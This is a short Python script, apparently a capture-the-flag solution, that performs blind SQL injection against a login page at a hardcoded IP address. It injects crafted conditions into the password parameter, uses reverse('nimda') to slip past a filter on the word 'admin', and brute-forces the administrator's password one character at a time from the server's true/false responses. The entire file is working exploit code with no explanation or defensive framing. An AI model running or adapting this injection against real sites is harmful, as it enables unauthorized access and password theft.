
#http://43.201.142.219:5120/index.php?username=reverse%28%22nimda%22%29&password=%27+or+ord(right(left(pw,1),1))%3E10%23
import requests


paylod = ""

password = ""

#13글자
for i in range(1,20):
    for j in reversed(range(33,127)):
        URL = 'http://43.201.142.219:5120/index.php?username=reverse("nimda")&password='
        URL += "' or ord(right(left(pw,"
        URL += str(i)
        URL += "),1))"
        URL += "like "
        URL += str(j)
        URL += ' and id like reverse("nimda")'
        URL += "%23"
        print(URL)
        res = requests.get(URL)
        print(res.text)
        if(res.text.find('true')>0):
            
                password += chr(j)
                print(password)
                break

                                    
            
        
print(password)
